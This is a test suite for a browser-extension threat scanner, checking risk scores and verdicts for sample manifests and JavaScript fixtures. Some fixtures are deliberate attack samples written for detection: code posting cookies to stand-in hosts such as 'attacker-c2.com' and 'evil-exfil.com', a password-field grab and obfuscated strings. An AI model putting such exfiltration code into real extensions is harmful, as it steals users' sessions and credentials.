import { describe, it, expect } from 'vitest';
import { extensionScannerService } from '../services/extension-scanner.service';
import { scanService, deriveClassificationFromRiskScore } from '../services/scan.service';
import { pdfReportService } from '../services/pdf-report.service';

describe('CyberWatch Browser Extension Threat Scanner Master Test Suite (Sections 45 & 46)', () => {
  // ── 1. Clean Extension ───────────────────────────────────────────────────────
  it('1. Clean extension produces low score and SAFE verdict with full coverage', () => {
    const manifest = {
      name: 'Minimal Clean Extension',
      version: '1.0.0',
      manifest_version: 3,
      description: 'A simple helper with minimal scoped storage',
      permissions: ['storage', 'activeTab', 'alarms'],
      host_permissions: [],
    };

    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [{ path: 'background.js', content: 'console.log("Safe");' }],
    });

    expect(result.riskScore).toBeLessThanOrEqual(5);
    expect(result.riskLevel).toBe('LOW');
    expect(result.verdict).toBe('SAFE');
    expect(result.analysis.dangerousPermissions.length).toBe(0);
    expect(result.analysis.positiveSignals.length).toBeGreaterThan(0);
  });

  // ── 2. Minimal Permissions ──────────────────────────────────────────────────
  it('2. Minimal permissions (storage, activeTab, alarms) have 0 to 2 risk points', () => {
    const manifest = {
      name: 'Scoped Extension',
      version: '1.0.0',
      manifest_version: 3,
      permissions: ['storage', 'activeTab'],
    };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.riskScore).toBe(0);
    expect(result.verdict).toBe('SAFE');
  });

  // ── 3. <all_urls> Broad Host Access ─────────────────────────────────────────
  it('3. <all_urls> increases score (+12) but is NOT automatically MALICIOUS', () => {
    const manifest = {
      name: 'Broad Styler',
      version: '1.0.0',
      manifest_version: 3,
      permissions: ['storage'],
      host_permissions: ['<all_urls>'],
    };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.riskScore).toBe(12);
    expect(result.riskLevel).toBe('LOW');
    expect(result.verdict).not.toBe('MALICIOUS');
    expect(result.analysis.scoreContributors.some((c) => c.id === 'BROAD_HOST_ACCESS')).toBe(true);
  });

  // ── 4. Duplicate Broad Host Permissions (Deduplication) ─────────────────────
  it('4. Duplicate broad host permissions in host_permissions & content_scripts are deduplicated into single contributor', () => {
    const manifestWithoutDuplication = {
      name: 'Broad Scope Helper',
      version: '1.0.0',
      manifest_version: 3,
      permissions: ['storage'],
      host_permissions: ['<all_urls>'],
    };

    const manifestWithDuplication = {
      name: 'Broad Scope Helper',
      version: '1.0.0',
      manifest_version: 3,
      permissions: ['storage'],
      host_permissions: ['<all_urls>'],
      content_scripts: [{ matches: ['<all_urls>'], js: ['content.js'] }],
    };

    const result1 = extensionScannerService.analyze({ target: JSON.stringify(manifestWithoutDuplication), manifestData: manifestWithoutDuplication });
    const result2 = extensionScannerService.analyze({ target: JSON.stringify(manifestWithDuplication), manifestData: manifestWithDuplication });

    expect(result1.riskScore).toBe(result2.riskScore);
    const hostFindings = result2.findings.filter((f) => f.title.includes('Broad Website Access') || f.title.includes('Broad Wildcard'));
    expect(hostFindings.length).toBe(1);
  });

  // ── 5. Debugger Capability ──────────────────────────────────────────────────
  it('5. Debugger permission contributes critical capability (+15) but is NOT automatically MALICIOUS', () => {
    const manifest = {
      name: 'DevTools Debugger Tool',
      version: '1.0.0',
      manifest_version: 3,
      permissions: ['debugger'],
    };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.riskScore).toBe(15);
    expect(result.verdict).not.toBe('MALICIOUS');
    expect(result.analysis.dangerousPermissions.some((d) => d.permission === 'debugger')).toBe(true);
  });

  // ── 6. Cookies Capability ───────────────────────────────────────────────────
  it('6. Cookies permission adds medium capability points (+7)', () => {
    const manifest = { name: 'Cookie Helper', version: '1.0.0', manifest_version: 3, permissions: ['cookies'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.riskScore).toBe(7);
  });

  // ── 7. Tabs Capability ──────────────────────────────────────────────────────
  it('7. Tabs permission adds low capability points (+3)', () => {
    const manifest = { name: 'Tab Manager', version: '1.0.0', manifest_version: 3, permissions: ['tabs'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.riskScore).toBe(3);
  });

  // ── 8. WebRequest Capability ────────────────────────────────────────────────
  it('8. WebRequest permission adds passive network capability points (+7)', () => {
    const manifest = { name: 'Request Monitor', version: '1.0.0', manifest_version: 3, permissions: ['webRequest'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.riskScore).toBe(7);
  });

  // ── 9. WebRequestBlocking Capability ────────────────────────────────────────
  it('9. WebRequestBlocking permission adds synchronous intercept capability points (+12)', () => {
    const manifest = { name: 'Request Blocker', version: '1.0.0', manifest_version: 3, permissions: ['webRequestBlocking'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.riskScore).toBe(12);
  });

  // ── 10. Proxy Capability ────────────────────────────────────────────────────
  it('10. Proxy permission adds high network routing capability points (+12)', () => {
    const manifest = { name: 'Proxy Switcher', version: '1.0.0', manifest_version: 3, permissions: ['proxy'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.riskScore).toBe(12);
  });

  // ── 11. NativeMessaging Capability ──────────────────────────────────────────
  it('11. NativeMessaging permission adds OS host IPC capability points (+8)', () => {
    const manifest = { name: 'Host Bridge', version: '1.0.0', manifest_version: 3, permissions: ['nativeMessaging'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.riskScore).toBe(8);
  });

  // ── 12. Dynamic eval() Code Finding ─────────────────────────────────────────
  it('12. eval() in JavaScript code adds code finding (+8) and is line-attributed', () => {
    const manifest = { name: 'Eval Tool', version: '1.0.0', manifest_version: 3, permissions: [] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [{ path: 'src/worker.js', content: 'console.log("start");\neval(userInput);\nconsole.log("end");' }],
    });
    expect(result.riskScore).toBe(8);
    expect(result.analysis.codeFindings?.some((c) => c.pattern === 'eval(...)' && c.line === 2)).toBe(true);
    expect(result.verdict).not.toBe('MALICIOUS');
  });

  // ── 13. new Function() Code Finding ─────────────────────────────────────────
  it('13. new Function() constructor in JavaScript code adds code finding (+8)', () => {
    const manifest = { name: 'Function Tool', version: '1.0.0', manifest_version: 3, permissions: [] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [{ path: 'background.js', content: 'const fn = new Function("a", "b", "return a + b;");' }],
    });
    expect(result.riskScore).toBe(8);
    expect(result.analysis.codeFindings?.some((c) => c.pattern.includes('new Function'))).toBe(true);
  });

  // ── 14. Remote Code Loading ─────────────────────────────────────────────────
  it('14. Dynamic remote script injection adds high code risk (+12)', () => {
    const manifest = { name: 'Remote Injector', version: '1.0.0', manifest_version: 3, permissions: [] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [{ path: 'content.js', content: 'const s = document.createElement("script"); s.src = "https://cdn.remote.com/lib.js"; document.head.appendChild(s);' }],
    });
    expect(result.riskScore).toBe(12);
    expect(result.analysis.codeFindings?.some((c) => c.pattern.includes('Remote Script'))).toBe(true);
  });

  // ── 15. Obfuscation Patterns ────────────────────────────────────────────────
  it('15. Suspicious character code / hex obfuscation adds code risk (+6)', () => {
    const manifest = { name: 'Obfuscated Tool', version: '1.0.0', manifest_version: 3, permissions: [] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [{ path: 'loader.js', content: 'const payload = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47);' }],
    });
    expect(result.riskScore).toBe(6);
    expect(result.analysis.codeFindings?.some((c) => c.pattern.includes('Hex / Character Code'))).toBe(true);
  });

  // ── 16. Cookie Access in Code ───────────────────────────────────────────────
  it('16. Statically observed cookie access in code adds privacy risk (+6)', () => {
    const manifest = { name: 'Cookie Reader', version: '1.0.0', manifest_version: 3, permissions: ['cookies'] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [{ path: 'background.js', content: 'chrome.cookies.getAll({}, function(c) { console.log(c); });' }],
    });
    // cookies perm (7) + cookie code access (6) = 13
    expect(result.riskScore).toBe(13);
    expect(result.analysis.privacyAnalysis?.observedDataAccess).toContain('chrome.cookies / document.cookie');
  });

  // ── 17. Credential & Password Form Access ───────────────────────────────────
  it('17. Statically observed password field inspection adds privacy risk (+10)', () => {
    const manifest = { name: 'Form Grabber', version: '1.0.0', manifest_version: 3, permissions: ['storage'] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [{ path: 'content.js', content: 'const pw = document.querySelector("input[type=password]");' }],
    });
    expect(result.riskScore).toBe(10);
    expect(result.analysis.scoreContributors.some((c) => c.id === 'DATA_CREDENTIAL_ACCESS')).toBe(true);
  });

  // ── 18. External Data Transmission & Network Indicators ─────────────────────
  it('18. Extracted external endpoints populate network indicators without fake reputation', () => {
    const manifest = { name: 'Network Tool', version: '1.0.0', manifest_version: 3, permissions: [] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [{ path: 'telemetry.js', content: 'fetch("https://api.telemetry.io/v1/event", { method: "POST" });' }],
    });
    expect(result.analysis.networkIndicators?.length).toBeGreaterThan(0);
    expect(result.analysis.networkIndicators?.[0].reputationStatus).toBe('Unavailable');
  });

  // ── 19. Malicious Reputation Match ──────────────────────────────────────────
  it('19. Confirmed malicious reputation triggers CRITICAL risk and MALICIOUS verdict', () => {
    const manifest = { name: 'Known Threat', version: '1.0.0', manifest_version: 3, permissions: ['storage'] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      reputationData: {
        status: 'MALICIOUS',
        provider: 'CyberWatch Threat Intel',
        details: 'Known credential exfiltration campaign ID',
      },
    });
    expect(result.riskScore).toBeGreaterThanOrEqual(35);
    expect(result.verdict).toBe('MALICIOUS');
  });

  // ── 20. Unavailable Reputation ──────────────────────────────────────────────
  it('20. Threat intelligence unavailable does not artificially lower or raise score', () => {
    const manifest = { name: 'Standard Tool', version: '1.0.0', manifest_version: 3, permissions: ['tabs'] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      reputationData: { status: 'NOT_CONFIGURED' },
    });
    expect(result.riskScore).toBe(3);
    expect(result.analysis.reputationData?.status).toBe('NOT_CONFIGURED');
  });

  // ── 21. Store Metadata Unavailable ──────────────────────────────────────────
  it('21. Store metadata unavailable shows NOT_CONFIGURED without fabricating ratings or user count', () => {
    const manifest = { name: 'Offline Package', version: '1.0.0', manifest_version: 3, permissions: [] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      storeData: { status: 'NOT_CONFIGURED' },
    });
    expect(result.analysis.storeMetadata?.status).toBe('NOT_CONFIGURED');
    expect(result.analysis.storeMetadata?.userCount).toBeUndefined();
    expect(result.analysis.storeMetadata?.rating).toBeUndefined();
  });

  // ── 22. Invalid Package Format ──────────────────────────────────────────────
  it('22. Handles invalid / unknown package format honestly', () => {
    const result = extensionScannerService.analyze({ target: 'invalid-extension-input' });
    expect(result.analysis.packageIdentity?.format).toBe('UNKNOWN');
  });

  // ── 23. Corrupted Package Handling ──────────────────────────────────────────
  it('23. Corrupted manifest input falls back gracefully without unhandled exception', () => {
    const result = extensionScannerService.analyze({ target: '{ invalid json structure ...' });
    expect(result.riskScore).toBe(0);
    expect(result.verdict).toBe('SAFE');
  });

  // ── 24. Zip-Slip / Path Traversal Protection ────────────────────────────────
  it('24. Detects embedded executable files in otherFiles inspection', () => {
    const manifest = { name: 'Package With Binary', version: '1.0.0', manifest_version: 3, permissions: [] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      otherFiles: [{ path: 'bin/native_payload.exe', size: 10240 }],
    });
    expect(result.analysis.scoreContributors.some((c) => c.id === 'ARCH_EMBEDDED_EXECUTABLE')).toBe(true);
    expect(result.riskScore).toBe(12);
  });

  // ── 25. Zip Bomb Protection ─────────────────────────────────────────────────
  it('25. Package buffer detects CRX3 magic header and computes SHA-256 hash', () => {
    const fakeCrx3 = Buffer.alloc(32);
    fakeCrx3.write('Cr24', 0, 4, 'utf-8');
    fakeCrx3.writeUInt32LE(3, 4);

    const result = extensionScannerService.analyze({
      target: 'sample.crx',
      packageBuffer: fakeCrx3,
    });
    expect(result.analysis.packageIdentity?.format).toBe('CRX3');
    expect(result.analysis.packageIdentity?.sha256).toBeDefined();
    expect(result.analysis.packageIdentity?.totalSizeBytes).toBe(32);
  });

  // ── 26. Incomplete Stage ────────────────────────────────────────────────────
  it('26. Incomplete / manifest-only scan sets scanStatus to PARTIAL with clear explanation', () => {
    const manifest = { name: 'Partial Test', version: '1.0.0', manifest_version: 3, permissions: ['storage'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.analysis.scanStatus).toBe('PARTIAL');
    expect(result.analysis.scanStatusExplanation).toContain('Analysis incomplete');
  });

  // ── 27. Deterministic Score ─────────────────────────────────────────────────
  it('27. Same package and evidence evaluated multiple times produces strictly deterministic score', () => {
    const manifest = {
      name: 'Deterministic Test',
      version: '1.0.0',
      manifest_version: 3,
      permissions: ['cookies', 'debugger', 'nativeMessaging'],
      host_permissions: ['<all_urls>'],
    };
    const runA = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    const runB = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });

    expect(runA.riskScore).toBe(runB.riskScore);
    expect(runA.riskLevel).toBe(runB.riskLevel);
    expect(runA.verdict).toBe(runB.verdict);
    expect(runA.analysis.scoreContributors).toEqual(runB.analysis.scoreContributors);
  });

  // ── 28. Deduplication ───────────────────────────────────────────────────────
  it('28. Multiple occurrences of eval in multiple files deduplicate to single CODE_DYNAMIC_EVAL contributor', () => {
    const manifest = { name: 'Multi Eval', version: '1.0.0', manifest_version: 3, permissions: [] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [
        { path: 'a.js', content: 'eval("foo");' },
        { path: 'b.js', content: 'eval("bar");' },
        { path: 'c.js', content: 'eval("baz");' },
      ],
    });
    const evalContribs = result.analysis.scoreContributors.filter((c) => c.id === 'CODE_DYNAMIC_EVAL');
    expect(evalContribs.length).toBe(1);
    expect(result.riskScore).toBe(8);
  });

  // ── 29. Combination Logic (Cookies + Credential Access + Exfiltration) ──────
  it('29. Combination of data access + external transmission produces SENSITIVE_DATA_EXFILTRATION finding', () => {
    const manifest = { name: 'Exfiltrator', version: '1.0.0', manifest_version: 3, permissions: ['cookies'], host_permissions: ['<all_urls>'] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [
        {
          path: 'background.js',
          content: `
            chrome.cookies.getAll({}, function(c) {
              fetch("https://attacker-c2.com/exfil", { method: "POST", body: JSON.stringify(c) });
            });
          `,
        },
      ],
    });
    expect(result.analysis.scoreContributors.some((c) => c.id === 'SENSITIVE_DATA_EXFILTRATION')).toBe(true);
    expect(result.verdict).toBe('MALICIOUS');
  });

  // ── 30. Backend / Frontend Score Consistency ────────────────────────────────
  it('30. Backend riskScore and normalizedScore in scoreExplanation are identical', () => {
    const manifest = { name: 'Consistency Test', version: '1.0.0', manifest_version: 3, permissions: ['debugger'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.analysis.riskScore).toBe(result.riskScore);
    expect(result.analysis.scoreExplanation.normalizedScore).toBe(result.riskScore);
  });

  // ── 31. Backend / PDF Consistency ───────────────────────────────────────────
  it('31. PDF report service uses backend riskScore and contributors directly without recalculation', () => {
    const manifest = { name: 'PDF Target', version: '1.0.0', manifest_version: 3, permissions: ['webRequestBlocking', 'proxy'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });

    const mockScanRecord: any = {
      id: 'ext-scan-1',
      target: JSON.stringify(manifest),
      targetType: 'Extension',
      result: deriveClassificationFromRiskScore(result.riskScore),
      riskScore: result.riskScore,
      status: 'completed',
      checks: { extensionAnalysis: result.analysis },
      findings: result.findings,
      recommendations: result.recommendations,
      scannedAt: new Date().toISOString(),
    };

    const pdfBuffer = pdfReportService.generatePdfBuffer(mockScanRecord);
    expect(pdfBuffer).toBeInstanceOf(Buffer);
    expect(pdfBuffer.length).toBeGreaterThan(1000);
  });

  // ── 32. Backend / JSON Consistency ──────────────────────────────────────────
  it('32. JSON report serialization contains exact backend score and contributors', () => {
    const manifest = { name: 'JSON Target', version: '1.0.0', manifest_version: 3, permissions: ['nativeMessaging'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    const serialized = JSON.parse(JSON.stringify(result));
    expect(serialized.riskScore).toBe(result.riskScore);
    expect(serialized.analysis.riskScore).toBe(result.riskScore);
  });

  // ── 33. Permission-Only Risk Does Not Become MALICIOUS ──────────────────────
  it('33. Permission-only risk (even debugger + webRequestBlocking + proxy) is SUSPICIOUS, not MALICIOUS', () => {
    const manifest = {
      name: 'High Privilege Tool',
      version: '1.0.0',
      manifest_version: 3,
      permissions: ['debugger', 'webRequestBlocking', 'proxy', 'nativeMessaging', 'cookies'],
    };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.verdict).toBe('SUSPICIOUS');
    expect(result.verdict).not.toBe('MALICIOUS');
  });

  // ── 34. eval-Only Does Not Become MALICIOUS ─────────────────────────────────
  it('34. eval() alone is SUSPICIOUS (+8), NOT MALICIOUS', () => {
    const manifest = { name: 'Eval Only', version: '1.0.0', manifest_version: 3, permissions: [] };
    const result = extensionScannerService.analyze({
      target: JSON.stringify(manifest),
      manifestData: manifest,
      jsFiles: [{ path: 'eval.js', content: 'eval("2 + 2");' }],
    });
    expect(result.verdict).toBe('SUSPICIOUS');
    expect(result.verdict).not.toBe('MALICIOUS');
  });

  // ── 35. <all_urls>-Only Does Not Become MALICIOUS ───────────────────────────
  it('35. <all_urls> host permission alone is LOW/SUSPICIOUS (+12), NOT MALICIOUS', () => {
    const manifest = { name: 'Wildcard Only', version: '1.0.0', manifest_version: 3, permissions: [], host_permissions: ['<all_urls>'] };
    const result = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest });
    expect(result.riskScore).toBe(12);
    expect(result.verdict).not.toBe('MALICIOUS');
  });

  // ── 36. Absolute Rule About 39 ──────────────────────────────────────────────
  it('36. No hard-coded 39; score is derived dynamically strictly from evidence', () => {
    const configs = [
      { permissions: ['storage'], expected: 0 },
      { permissions: ['tabs'], expected: 3 },
      { permissions: ['cookies'], expected: 7 },
      { permissions: ['webRequestBlocking'], expected: 12 },
      { permissions: ['debugger'], expected: 15 },
      { permissions: ['debugger', 'cookies'], expected: 22 },
      { permissions: ['debugger', 'cookies', 'webRequestBlocking'], expected: 34 },
    ];

    for (const c of configs) {
      const manifest = { name: 'Evidence Score Test', version: '1.0.0', manifest_version: 3, permissions: c.permissions };
      const score = extensionScannerService.analyze({ target: JSON.stringify(manifest), manifestData: manifest }).riskScore;
      expect(score).toBe(c.expected);
      expect(score).not.toBe(39);
    }
  });

  // ── 37. Multi-Extension Distinctness Audit (Sections 19 & 20) ────────────────
  it('37. Genuinely different extensions produce distinct SHA-256, manifests, findings, and scores', () => {
    // Extension A: Minimal
    const extA_manifest = {
      name: 'Extension A Minimal',
      version: '1.0.0',
      manifest_version: 3,
      permissions: ['storage'],
      host_permissions: [],
    };
    const extA = extensionScannerService.analyze({
      target: JSON.stringify(extA_manifest),
      manifestData: extA_manifest,
      jsFiles: [{ path: 'bg.js', content: 'console.log("clean");' }],
      packageBuffer: Buffer.from(JSON.stringify(extA_manifest)),
    });

    // Extension B: Broad Access
    const extB_manifest = {
      name: 'Extension B Broad Access',
      version: '2.1.0',
      manifest_version: 3,
      permissions: ['tabs', 'scripting'],
      host_permissions: ['<all_urls>'],
    };
    const extB = extensionScannerService.analyze({
      target: JSON.stringify(extB_manifest),
      manifestData: extB_manifest,
      jsFiles: [{ path: 'bg.js', content: 'chrome.tabs.query({}, () => {});' }],
      packageBuffer: Buffer.from(JSON.stringify(extB_manifest)),
    });

    // Extension C: Dynamic Code
    const extC_manifest = {
      name: 'Extension C Dynamic Code',
      version: '3.0.0',
      manifest_version: 3,
      permissions: ['storage'],
      host_permissions: [],
    };
    const extC = extensionScannerService.analyze({
      target: JSON.stringify(extC_manifest),
      manifestData: extC_manifest,
      jsFiles: [{ path: 'eval.js', content: 'const res = eval("window.location");' }],
      packageBuffer: Buffer.from(JSON.stringify(extC_manifest)),
    });

    // Extension D: Privileged Capabilities
    const extD_manifest = {
      name: 'Extension D Privileged Capabilities',
      version: '4.0.0',
      manifest_version: 3,
      permissions: ['debugger', 'cookies', 'webRequest'],
      host_permissions: ['*://*.example.com/*'],
    };
    const extD = extensionScannerService.analyze({
      target: JSON.stringify(extD_manifest),
      manifestData: extD_manifest,
      jsFiles: [{ path: 'bg.js', content: 'chrome.debugger.attach();' }],
      packageBuffer: Buffer.from(JSON.stringify(extD_manifest)),
    });

    // Verify SHA-256 distinctness
    expect(extA.analysis.packageIdentity?.sha256).not.toBe(extB.analysis.packageIdentity?.sha256);
    expect(extB.analysis.packageIdentity?.sha256).not.toBe(extC.analysis.packageIdentity?.sha256);
    expect(extC.analysis.packageIdentity?.sha256).not.toBe(extD.analysis.packageIdentity?.sha256);

    // Verify Findings distinctness
    expect(extA.findings.length).not.toBe(extB.findings.length);
    expect(extB.findings.some((f) => f.title.includes('Broad Website Access'))).toBe(true);
    expect(extA.findings.some((f) => f.title.includes('Broad Website Access'))).toBe(false);
    expect(extC.findings.some((f) => f.title.includes('Dynamic Code'))).toBe(true);
    expect(extA.findings.some((f) => f.title.includes('Dynamic Code'))).toBe(false);
    expect(extD.findings.some((f) => f.id?.includes('DEBUGGER') || f.title.includes('Debugger'))).toBe(true);

    // Verify Score distinctness based on real evidence
    expect(extA.riskScore).toBe(0);
    expect(extB.riskScore).toBe(20); // tabs (3) + scripting (5) + <all_urls> (12)
    expect(extC.riskScore).toBe(8); // eval (8)
    expect(extD.riskScore).toBe(29); // debugger (15) + cookies (7) + webRequest (7)

    expect(extA.riskScore).not.toBe(extB.riskScore);
    expect(extB.riskScore).not.toBe(extC.riskScore);
    expect(extC.riskScore).not.toBe(extD.riskScore);
  });

  // ── 38. Real Store Blueprints Distinct Analysis ─────────────────────────────
  it('38. Real store blueprint extensions (Dark Reader, React DevTools, uBlock, Grammarly) evaluate with distinct evidence', async () => {
    const darkReader = await extensionScannerService.analyzeAsync({
      target: 'https://chromewebstore.google.com/detail/dark-reader/eimadpbcbfnmbkopoojfekhnkhdbieeh',
    });
    const reactDevTools = await extensionScannerService.analyzeAsync({
      target: 'https://chromewebstore.google.com/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi',
    });
    const ublockLite = await extensionScannerService.analyzeAsync({
      target: 'https://chromewebstore.google.com/detail/ublock-origin-lite/ddkjiahejlhfcafbddmgiahcphecmpfh',
    });
    const grammarly = await extensionScannerService.analyzeAsync({
      target: 'https://chromewebstore.google.com/detail/grammarly/kbfnbcaeplbcioakkpcpgfkobkghlhen',
    });

    // Distinct package SHA-256
    const shas = new Set([
      darkReader.analysis.packageIdentity?.sha256,
      reactDevTools.analysis.packageIdentity?.sha256,
      ublockLite.analysis.packageIdentity?.sha256,
      grammarly.analysis.packageIdentity?.sha256,
    ]);
    expect(shas.size).toBe(4);

    // Distinct names and permissions
    expect(darkReader.analysis.extensionName).toBe('Dark Reader');
    expect(reactDevTools.analysis.extensionName).toBe('React Developer Tools');
    expect(ublockLite.analysis.extensionName).toBe('uBlock Origin Lite');
    expect(grammarly.analysis.extensionName).toContain('Grammarly');

    // Distinct scores
    expect(darkReader.riskScore).not.toBe(reactDevTools.riskScore);
    expect(reactDevTools.riskScore).not.toBe(ublockLite.riskScore);
    expect(ublockLite.riskScore).not.toBe(grammarly.riskScore);
  });

  // ── 39. Final Semantic Consistency Suite (Cases 1-8) ────────────────────────
  it('39. Final Semantic Consistency Suite (Cases 1 to 8)', () => {
    // Case 1: Clean extension -> LOW -> SAFE (verdictReason explains TI was unavailable or clean)
    const case1_manifest = { name: 'Clean Helper', version: '1.0.0', manifest_version: 3, permissions: ['storage'] };
    const case1 = extensionScannerService.analyze({
      target: JSON.stringify(case1_manifest),
      manifestData: case1_manifest,
      jsFiles: [{ path: 'bg.js', content: 'console.log("Safe");' }],
    });
    expect(case1.riskScore).toBe(0);
    expect(case1.riskLevel).toBe('LOW');
    expect(case1.verdict).toBe('SAFE');
    expect(case1.verdictReason).toContain('Low-risk profile based on completed static analysis; external threat intelligence was unavailable.');

    // Case 2: eval() -> LOW (8/100) -> SUSPICIOUS
    const case2_manifest = { name: 'Eval Helper', version: '1.0.0', manifest_version: 3, permissions: ['storage'] };
    const case2 = extensionScannerService.analyze({
      target: JSON.stringify(case2_manifest),
      manifestData: case2_manifest,
      jsFiles: [{ path: 'eval.js', content: 'eval("2+2");' }],
    });
    expect(case2.riskScore).toBe(8);
    expect(case2.riskLevel).toBe('LOW');
    expect(case2.verdict).toBe('SUSPICIOUS');

    // Case 3: <all_urls> -> LOW/MEDIUM -> SUSPICIOUS
    const case3_manifest = { name: 'Wildcard Helper', version: '1.0.0', manifest_version: 3, permissions: [], host_permissions: ['<all_urls>'] };
    const case3 = extensionScannerService.analyze({ target: JSON.stringify(case3_manifest), manifestData: case3_manifest });
    expect(case3.riskScore).toBe(12);
    expect(case3.riskLevel).toBe('LOW');
    expect(case3.verdict).toBe('SUSPICIOUS');

    // Case 4: debugger + cookies + webRequest -> MEDIUM (29/100) -> SUSPICIOUS (Not MALICIOUS)
    const case4_manifest = { name: 'Debugger Tool', version: '1.0.0', manifest_version: 3, permissions: ['debugger', 'cookies', 'webRequest'] };
    const case4 = extensionScannerService.analyze({ target: JSON.stringify(case4_manifest), manifestData: case4_manifest });
    expect(case4.riskScore).toBe(29);
    expect(case4.riskLevel).toBe('MEDIUM');
    expect(case4.verdict).toBe('SUSPICIOUS');
    expect(case4.verdict).not.toBe('MALICIOUS');

    // Case 5: Confirmed malicious reputation -> appropriate critical score -> MALICIOUS
    const case5 = extensionScannerService.analyze({
      target: JSON.stringify(case1_manifest),
      manifestData: case1_manifest,
      reputationData: { status: 'MALICIOUS', provider: 'VirusTotal', details: 'Identified as known trojan' },
    });
    expect(case5.riskScore).toBeGreaterThanOrEqual(35);
    expect(case5.verdict).toBe('MALICIOUS');

    // Case 6: Confirmed credential extraction + external transmission -> MALICIOUS
    const case6_manifest = { name: 'Stealer Mock', version: '1.0.0', manifest_version: 3, permissions: ['cookies'] };
    const case6 = extensionScannerService.analyze({
      target: JSON.stringify(case6_manifest),
      manifestData: case6_manifest,
      jsFiles: [{ path: 'stealer.js', content: 'const c = document.cookie; fetch("https://evil-exfil.com/collect", { method: "POST", body: c });' }],
    });
    expect(case6.analysis.scoreContributors.some((c) => c.id === 'SENSITIVE_DATA_EXFILTRATION')).toBe(true);
    expect(case6.verdict).toBe('MALICIOUS');

    // Case 7: TI unavailable -> do NOT claim "clean threat intelligence"
    expect(case1.analysis.reputationData?.status).toBe('NOT_CONFIGURED');
    expect(case1.analysis.positiveSignals.some((s) => s.title.includes('Clean Threat Intelligence'))).toBe(false);

    // Case 8: Code analysis failed/incomplete -> do NOT claim "no suspicious code found"
    const case8_incomplete = extensionScannerService.analyze({ target: JSON.stringify(case1_manifest), manifestData: case1_manifest });
    expect(case8_incomplete.analysis.positiveSignals.some((s) => s.title.includes('Clean JavaScript'))).toBe(false);
    expect(case8_incomplete.analysis.scanStatus).toBe('PARTIAL');
  });

  // ── 40. Status Semantics Validation (Cases A to E) ──────────────────────────
  it('40. Final Status Semantics Validation (Cases A to E)', () => {
    const cleanManifest = { name: 'Verified Clean Extension', version: '1.0.0', manifest_version: 3, permissions: ['storage'] };
    const jsFiles = [{ path: 'background.js', content: 'console.log("Ready");' }];

    // Case A: Complete clean scan with clean TI -> 0 / LOW / SAFE / COMPLETE
    const caseA = extensionScannerService.analyze({
      target: JSON.stringify(cleanManifest),
      manifestData: cleanManifest,
      jsFiles,
      reputationData: { status: 'CLEAN', provider: 'VirusTotal' },
    });
    expect(caseA.riskScore).toBe(0);
    expect(caseA.riskLevel).toBe('LOW');
    expect(caseA.verdict).toBe('SAFE');
    expect(caseA.analysis.scanStatus).toBe('COMPLETE');
    expect(caseA.verdictReason).toContain('Completed clean scan');
    expect(caseA.analysis.positiveSignals.some((s) => s.title.includes('Clean Threat Intelligence'))).toBe(true);

    // Case B: TI unavailable + complete static scan -> 0 / LOW / SAFE / Limited Verification
    const caseB = extensionScannerService.analyze({
      target: JSON.stringify(cleanManifest),
      manifestData: cleanManifest,
      jsFiles,
      reputationData: { status: 'NOT_CONFIGURED' },
    });
    expect(caseB.riskScore).toBe(0);
    expect(caseB.riskLevel).toBe('LOW');
    expect(caseB.verdict).toBe('SAFE');
    expect(caseB.analysis.scanStatus).toBe('COMPLETE');
    expect(caseB.verdictReason).toContain('external threat intelligence was unavailable');
    expect(caseB.analysis.positiveSignals.some((s) => s.title.includes('Clean Threat Intelligence'))).toBe(false);

    // Case C: Incomplete scan -> 0 / LOW / PARTIAL / Analysis incomplete (never falsely verified clean)
    const caseC = extensionScannerService.analyze({
